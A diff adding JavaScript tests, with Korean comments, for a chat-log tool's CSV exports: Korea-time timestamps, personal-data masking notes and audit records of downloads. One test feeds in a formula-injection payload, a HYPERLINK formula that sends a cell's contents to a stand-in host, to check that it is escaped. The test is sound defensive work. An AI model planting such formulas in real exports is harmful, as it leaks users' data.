@@ -1948,7 +1948,7 @@ test('감사 로그가 작업을 이름으로 말한다 (DS 22-3)', opts, async 
 
     const csv = audit.auditToCsv();
     const [header, first] = csv.split('\r\n');
-    assert.equal(header, '번호,시각,작업,작업코드,대상,내용,인증', '열 이름이 받는 사람의 말이 아니다');
+    assert.equal(header, '번호,시각,작업,작업코드,대상,내용,인증,시각(ISO)', '열 이름이 받는 사람의 말이 아니다');
     assert.ok(first.includes('파트너 등록·수정'), `작업 이름이 빠졌다: ${first}`);
     assert.ok(first.includes('partner.upsert'), '옮겨 담을 코드 열이 빠졌다');
     assert.ok(first.includes('로그인됨'), '인증 여부가 true/false 로 남았다');
@@ -3040,4 +3040,231 @@ test('마스킹 규칙은 한 벌이고 울타리를 넘는 쪽이 더 세다 (D
   const dropped = buildEntry('info', 'request', { message: '010-1234-5678' });
   assert.equal(dropped.message, undefined);
   assert.deepEqual(dropped.dropped, ['message']);
+});
+
+/* ══════════ 디자인 스프린트 — 37차 재감사 (DS 40-1·40-2·40-3) ══════════ */
+
+/** CSV 한 줄을 칸으로 가른다(RFC 4180 — 따옴표 안의 쉼표·줄바꿈을 지킨다). */
+function csvCells(line) {
+  const out = [];
+  let cur = '';
+  let quoted = false;
+  for (let i = 0; i < line.length; i += 1) {
+    const c = line[i];
+    if (quoted) {
+      if (c === '"' && line[i + 1] === '"') {
+        cur += '"';
+        i += 1;
+      } else if (c === '"') quoted = false;
+      else cur += c;
+    } else if (c === '"') quoted = true;
+    else if (c === ',') {
+      out.push(cur);
+      cur = '';
+    } else cur += c;
+  }
+  out.push(cur);
+  return out;
+}
+
+/**
+ * 머리글 이름으로 칸을 찾아 읽는다 — 열이 늘어도 테스트가 자리 수에 매이지 않게.
+ * 꼬리 주석(`# …`)은 쉼표가 들어 있으면 따옴표에 싸이므로 **줄 글자가 아니라 첫 칸**으로 가린다.
+ */
+function csvTable(csv) {
+  const lines = csv.split('\r\n');
+  const header = csvCells(lines[0]);
+  const rows = [];
+  const notes = [];
+  for (const line of lines.slice(1)) {
+    if (line === '') continue;
+    const cells = csvCells(line);
+    if (cells[0].startsWith('#')) {
+      notes.push(cells[0]);
+      continue;
+    }
+    const row = {};
+    header.forEach((h, i) => {
+      row[h] = cells[i];
+    });
+    rows.push(row);
+  }
+  return { header, rows, notes };
+}
+
+/**
+ * DS 40-1 — 내려받은 파일의 시각이 **UTC** 로 나가던 자리.
+ *
+ * 화면은 브라우저 시간대로 그리고 파일 **이름**도 `kstStamp` 로 한국 날짜를 붙이는데, 정작 파일
+ * 안의 행만 `at` 원문(ISO·UTC)이었다. 한국 자정~오전 9시의 대화는 엑셀에서 **전날**로 분류되어,
+ * 같은 데이터가 화면과 파일에서 다른 날에 속했다(대시보드 「오늘 대화」는 `kstDate` 로 센다).
+ */
+test('내려받은 파일의 시각은 한국 시간이고, 원문도 함께 남는다 (DS 40-1)', opts, async () => {
+  const { kstDateTime, kstDate } = await importLib('kst');
+  const conv = await importLib('convlog', CONVLOG_DEPS);
+  const audit = await importLib('audit');
+
+  // ① 한국 자정을 넘긴 시각 — ISO 의 날짜와 한국 날짜가 **다른 날**이다(그래서 재현된다).
+  const crossing = '2026-10-16T15:30:00.000Z';
+  assert.equal(crossing.slice(0, 10), '2026-10-16', '재현 전제: ISO 원문의 날짜');
+  assert.equal(kstDate(new Date(crossing)), '2026-10-17', '재현 전제: 한국 날짜는 다음 날이다');
+  assert.equal(kstDateTime(crossing), '2026-10-17 00:30:00');
+  // 오전 9시 전 — 반대 방향(ISO 는 같은 날인데 한국은 그날 오전)도 어긋나지 않는다.
+  assert.equal(kstDateTime('2026-10-16T00:30:00.000Z'), '2026-10-16 09:30:00');
+  // 읽을 수 없는 값에는 **지금 시각을 지어내지 않는다**.
+  assert.equal(kstDateTime(''), '');
+  assert.equal(kstDateTime('어제'), '');
+
+  // ② 대화 기록 CSV — 「시각」은 한국 시간, 「시각(ISO)」는 원문 그대로.
+  conv.resetLogs();
+  try {
+    conv.importTurns({
+      version: 1,
+      savedAt: crossing,
+      seq: 1,
+      turns: [{
+        id: 'T-000001', sessionId: 's1', channel: 'web', tenant: null,
+        message: '영업시간 알려주세요', reply: '평일 9시부터입니다',
+        intent: 'hours', source: 'kb', escalate: false, at: crossing,
+      }],
+    });
+    const t = csvTable(conv.turnsToCsv());
+    assert.equal(t.rows.length, 1, `행이 하나여야 한다: ${JSON.stringify(t.rows)}`);
+    assert.equal(t.rows[0]['시각'], '2026-10-17 00:30:00', '대화 기록 CSV 의 시각이 한국 시간이 아니다');
+    assert.equal(t.rows[0]['시각(ISO)'], crossing, '기계가 보는 원문 열이 사라졌다');
+    assert.ok(t.notes.some((n) => n.includes('한국 시간')), '파일이 제 시각 기준을 말하지 않는다');
+  } finally {
+    conv.resetLogs();
+  }
+
+  // ③ 변경 이력 CSV — 같은 규칙이 걸린다(두 파일이 다른 시간대로 말하면 대조할 수 없다).
+  audit.resetAudit();
+  try {
+    audit.logAudit({ action: 'kb.upsert', target: 'KB-1', detail: '등록', authed: true });
+    const t = csvTable(audit.auditToCsv());
+    const row = t.rows[0];
+    assert.match(row['시각'], /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/, '변경 이력 CSV 의 시각이 ISO 원문이다');
+    assert.equal(row['시각'].includes('T'), false, 'ISO 원문이 사람이 읽는 칸에 남았다');
+    assert.match(row['시각(ISO)'], /^\d{4}-\d{2}-\d{2}T.*Z$/, '원문 열이 없다');
+    assert.equal(row['시각'], kstDateTime(row['시각(ISO)']), '두 열이 같은 시각을 가리키지 않는다');
+    assert.ok(t.notes.some((n) => n.includes('한국 시간')), '변경 이력 파일이 시각 기준을 말하지 않는다');
+  } finally {
+    audit.resetAudit();
+  }
+});
+
+/**
+ * DS 40-2 — 내려받은 파일이 **「가렸다」는 사실**과 **담긴 범위**를 말하지 않던 자리.
+ *
+ * 본문은 저장될 때 가려지는데(DS 39-1) 운영 화면은 그 사실을 말하고(서랍 머리의 「개인정보
+ * 가림 · 휴대폰 번호」) 파일에는 그 칸이 없었다 — 받는 사람은 `***-****-5678` 을 보고
+ * **고객이 그렇게 쓴 줄** 안다. 보관 범위도 화면만 말하고 파일은 말하지 않았다.
+ */
+test('내려받은 대화 기록이 가린 것과 담긴 범위를 말한다 (DS 40-2)', opts, async () => {
+  const conv = await importLib('convlog', CONVLOG_DEPS);
+  conv.resetLogs();
+  try {
+    conv.logTurn({
+      sessionId: 's-pii', channel: 'web', tenant: null,
+      message: '제 번호 010-1234-5678이고 주민번호는 900101-1234567이에요',
+      reply: '확인했습니다', intent: 'contact_captured', source: 'rule', escalate: false,
+    });
+    conv.logTurn({
+      sessionId: 's-clean', channel: 'web', tenant: null,
+      message: '영업시간 알려주세요', reply: '평일 9시부터입니다',
+      intent: 'hours', source: 'kb', escalate: false,
+    });
+
+    const csv = conv.turnsToCsv();
+    const t = csvTable(csv);
+    assert.ok(t.header.includes('개인정보 가림'), '파일에 가림 표시 열이 없다');
+
+    // ① 가린 줄은 종류를 **사람 말**로 적는다(코드 `phone`·`rrn` 이 아니다).
+    const masked = t.rows.find((r) => r['대화'] === 's-pii');
+    assert.equal(masked['개인정보 가림'], '주민등록번호, 휴대폰 번호', `가린 종류가 어긋난다: ${masked['개인정보 가림']}`);
+    assert.equal(/[A-Za-z]/.test(masked['개인정보 가림']), false, '가린 종류에 영문 코드가 섞였다');
+    // ② 원문은 파일에도 없다(저장 경계에서 이미 가려졌다 — 이 열은 그 사실을 말할 뿐이다).
+    assert.equal(csv.includes('010-1234-5678'), false, '내려받기 파일에 번호 원문이 남았다');
+    assert.equal(csv.includes('900101-1234567'), false, '내려받기 파일에 주민번호 원문이 남았다');
+    assert.ok(masked['고객 메시지'].includes('010-****-5678'), '가린 글이 실리지 않았다');
+
+    // ③ 가린 것이 없는 줄은 **빈 칸**이다 — 짧은 말에 붙는 표시도 거짓이다.
+    const clean = t.rows.find((r) => r['대화'] === 's-clean');
+    assert.equal(clean['개인정보 가림'], '', `가린 것이 없는데 뭔가 적었다: ${clean['개인정보 가림']}`);
+
+    // ④ 파일이 제 내용을 말한다 — 담긴 건수·보관 한도·가림·줄임 표시.
+    const notes = t.notes.join('\n');
+    assert.ok(notes.includes(`대화 ${t.rows.length}건`), `담긴 건수를 말하지 않는다:\n${notes}`);
+    assert.ok(notes.includes(`보관 한도 ${conv.TURN_RETENTION}건`), '보관 한도를 말하지 않는다');
+    assert.ok(notes.includes('개인정보를 가린 글'), '가렸다는 사실을 말하지 않는다');
+    assert.ok(notes.includes('이하 생략'), '줄인 글의 표시를 설명하지 않는다');
+    // 주석은 표와 빈 줄로 떨어져 있고 모두 `#` 로 시작한다(정산 CSV 와 같은 모양).
+    assert.ok(csv.includes('\r\n\r\n'), '주석이 표에 붙어 있다');
+    assert.equal(t.notes.length, 4, `주석 수가 다르다: ${t.notes.length}`);
+    for (const n of t.notes) assert.ok(n.startsWith('# '), `주석 모양이 다르다: ${n}`);
+
+    // ⑤ 수식 주입은 여전히 막는다(공용 이스케이프를 지난다).
+    conv.logTurn({
+      sessionId: 's-formula', channel: 'web', tenant: null,
+      message: '=HYPERLINK("http://x/?d="&A2,"확인")', reply: '@SUM(A1)',
+      intent: 'fallback', source: 'fallback', escalate: false,
+    });
+    const after = conv.turnsToCsv();
+    assert.equal(/(^|,)=HYPERLINK/m.test(after), false, '수식이 그대로 실렸다');
+    assert.equal(/(^|,)@SUM/m.test(after), false, '수식이 그대로 실렸다');
+    assert.ok(after.includes("'=HYPERLINK"), '원문은 보존되어야 한다');
+  } finally {
+    conv.resetLogs();
+  }
+});
+
+/**
+ * DS 40-3 — 개인정보가 담긴 내려받기가 **흔적을 남기지 않던** 자리.
+ *
+ * 정산 리포트(금액·개인정보 없음)만 감사 로그에 남았다. 두 창구가 같은 이유로 쿼리 토큰까지
+ * 열어 두고 있었는데(브라우저 다운로드), 상담 내용 보존분 전체를 꺼내 가는 쪽은 비어 있었다.
+ * 함께: 복원이 받아들이는 작업 코드 목록이 **두 벌**이어서, 새 작업 종류가 조용히 버려졌다.
+ */
+test('내려받기도 변경 이력에 남고, 작업 코드 목록은 한 벌이다 (DS 40-3)', opts, async () => {
+  const audit = await importLib('audit');
+  audit.resetAudit();
+  try {
+    // ① 새 작업 종류에 사람 말 이름이 있다(코드가 표·필터에 그대로 남지 않는다).
+    assert.equal(audit.auditActionLabel('conversation.export'), '대화 기록 내려받기');
+    assert.equal(audit.auditActionLabel('backup.export'), '백업 내려받기');
+
+    // ② **복원이 전부 받아들인다** — 종전에는 받아들이는 목록이 손으로 적은 사본이어서,
+    //    사전에만 추가된 코드는 백업을 되돌릴 때 조용히 사라졌다(누가 언제 했는지 알 수 없다).
+    const codes = Object.keys(audit.AUDIT_ACTION_LABELS);
+    assert.ok(codes.includes('conversation.export') && codes.includes('backup.export'));
+    const snapshot = {
+      version: 1,
+      savedAt: new Date().toISOString(),
+      seq: codes.length,
+      events: codes.map((action, i) => ({
+        id: `A-${String(i + 1).padStart(6, '0')}`,
+        at: new Date().toISOString(),
+        action,
+        target: '',
+        detail: '복원 대상',
+        authed: true,
+      })),
+    };
+    const r = audit.importAudit(snapshot);
+    assert.equal(r.ok, true);
+    assert.equal(r.count, codes.length, `복원에서 ${codes.length - r.count}종이 조용히 버려졌다`);
+    const restored = audit.listAudit(500).map((e) => e.action);
+    for (const c of codes) assert.ok(restored.includes(c), `${c} 가 복원에서 사라졌다`);
+    // 모르는 코드는 여전히 들이지 않는다(옛 스냅샷의 쓰레기 값을 표에 세우지 않는다).
+    assert.equal(audit.importAudit({ ...snapshot, events: [{ ...snapshot.events[0], action: 'someone.new' }] }).count, 0);
+
+    // ③ 내려받기 기록에는 **건수만** 남고 대화 본문·연락처는 싣지 않는다(§10.3).
+    audit.resetAudit();
+    audit.logAudit({ action: 'conversation.export', detail: '대화 7건(보관분 전체)', authed: true });
+    const csv = audit.auditToCsv();
+    assert.ok(csv.includes('대화 기록 내려받기'), '내려받은 사실이 변경 이력에 남지 않는다');
+    assert.ok(csv.includes('대화 7건(보관분 전체)'), '무엇을 꺼내 갔는지 남지 않는다');
+  } finally {
+    audit.resetAudit();
+  }
 });
